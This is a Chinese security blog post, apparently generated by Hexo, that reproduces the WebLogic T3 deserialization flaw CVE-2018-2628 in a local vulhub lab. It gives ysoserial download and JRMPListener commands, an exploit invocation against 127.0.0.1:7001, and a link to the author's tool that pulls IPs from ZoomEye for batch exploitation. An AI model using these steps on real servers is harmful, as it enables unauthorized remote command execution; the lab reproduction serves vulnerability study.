@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言 复现CVE-2018-2628的反序列化漏洞，正好还欠慕慕一个对应的利用脚本。随便就一起搞了，搭建这个靶场可真的是耗费时间= =  BGM 方圆几里: 正文 首先去vulhub下好对应的项目，进入对应的文件夹，执行：1docker-compose up -d 搭建好环境后，访问：127.0.0.1:7001出现以下： 漏洞介绍  Oracle 2018年4月补丁中，修复了Weblogic S">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic deserialization vulnerability recurrence (CVE-2018-2628)">
+<meta property="og:url" content="http://422926799.github.io/posts/5a7054a8.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言 复现CVE-2018-2628的反序列化漏洞，正好还欠慕慕一个对应的利用脚本。随便就一起搞了，搭建这个靶场可真的是耗费时间= =  BGM 方圆几里: 正文 首先去vulhub下好对应的项目，进入对应的文件夹，执行：1docker-compose up -d 搭建好环境后，访问：127.0.0.1:7001出现以下： 漏洞介绍  Oracle 2018年4月补丁中，修复了Weblogic S">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://5b0988e595225.cdn.sohucs.com/images/20180705/7ce9bee1c06544e8992b78c0a1b29dff.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/16/ksQKVH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/16/kstj2j.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/16/ksNMdK.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/16/ksNaeP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/16/ksNszj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/16/ksNTSJ.png">
+<meta property="og:updated_time" content="2019-04-19T12:36:16.167Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weblogic deserialization vulnerability recurrence (CVE-2018-2628)">
+<meta name="twitter:description" content="前言 复现CVE-2018-2628的反序列化漏洞，正好还欠慕慕一个对应的利用脚本。随便就一起搞了，搭建这个靶场可真的是耗费时间= =  BGM 方圆几里: 正文 首先去vulhub下好对应的项目，进入对应的文件夹，执行：1docker-compose up -d 搭建好环境后，访问：127.0.0.1:7001出现以下： 漏洞介绍  Oracle 2018年4月补丁中，修复了Weblogic S">
+<meta name="twitter:image" content="http://5b0988e595225.cdn.sohucs.com/images/20180705/7ce9bee1c06544e8992b78c0a1b29dff.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Weblogic deserialization vulnerability recurrence (CVE-2018-2628)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/517258dd.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/8c872ea6.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/5a7054a8.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/5a7054a8.html&text=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/5a7054a8.html&is_video=false&description=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)&body=Check out this article: http://422926799.github.io/posts/5a7054a8.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/5a7054a8.html&name=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Weblogic deserialization vulnerability recurrence (CVE-2018-2628)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-02-16T08:38:27.000Z" itemprop="datePublished">2019-02-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
+<p>复现CVE-2018-2628的反序列化漏洞，正好还欠慕慕一个对应的利用脚本。随便就一起搞了，搭建这个靶场可真的是耗费时间= =</p>
+<p><img src="http://5b0988e595225.cdn.sohucs.com/images/20180705/7ce9bee1c06544e8992b78c0a1b29dff.jpg" alt="7ce9bee1c06544e8992b78c0a1b29dff.jpg"></p>
+<p><b>BGM 方圆几里:</b><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27955658&auto=1&height=66"></iframe></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr>
+<p>首先去vulhub下好对应的项目，进入对应的文件夹，执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>搭建好环境后，访问：127.0.0.1:7001<br>出现以下：<br><img src="https://s2.ax1x.com/2019/02/16/ksQKVH.png" alt="ksQKVH.png"></p>
+<p><b>漏洞介绍</b></p>
+<blockquote>
+<p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p>
+</blockquote>
+<p><b>漏洞复现</b><br>下载对应的利用工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br><span class="line">copy里面的利用代码https://www.exploit-db.com/exploits/44553</span><br></pre></td></tr></table></figure></p>
+<p>利用：<br>启动一个JRMP Server：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br><span class="line"></span><br><span class="line">listen port=监听的端口</span><br><span class="line">command=你要执行的命令</span><br><span class="line"></span><br><span class="line">例子：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1001 CommonsCollections1 &apos;touch /haq520&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/02/16/kstj2j.png" alt="kstj2j.png"></p>
+<p>发送exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python exp.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 127.0.0.1 1099 JRMPClient</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/02/16/ksNMdK.md.png" alt=""></p>
+<p>结果：<br><img src="https://s2.ax1x.com/2019/02/16/ksNaeP.png" alt="ksNaeP.png"> </p>
+<p><b>实战</b><br>上面说了欠慕慕一个脚本，这里下午写完。放入了仓库<br><a href="https://github.com/422926799/python/tree/master/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">python/weblogic反序列化批量利用 at master · 422926799/python · GitHub</a></p>
+<p>说明：<br>weblogic反序列化批量利用，可通过网页关键字判断是否weblogic服务，批量检测或单个检测，判断7001端口是否开放,可从zoomeye抓取IP，请自行配置config文件夹里面的search.ini，填写zoomeye的user和pwd。</p>
+<p>测试结果：<br><img src="https://s2.ax1x.com/2019/02/16/ksNszj.png" alt="ksNszj.png"></p>
+<p><img src="https://s2.ax1x.com/2019/02/16/ksNTSJ.png" alt="ksNTSJ.png"></p>
+<p>转载请声明：转自422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/5a7054a8.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/5a7054a8.html&text=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/5a7054a8.html&is_video=false&description=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)&body=Check out this article: http://422926799.github.io/posts/5a7054a8.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/5a7054a8.html&title=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/5a7054a8.html&name=Weblogic deserialization vulnerability recurrence (CVE-2018-2628)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
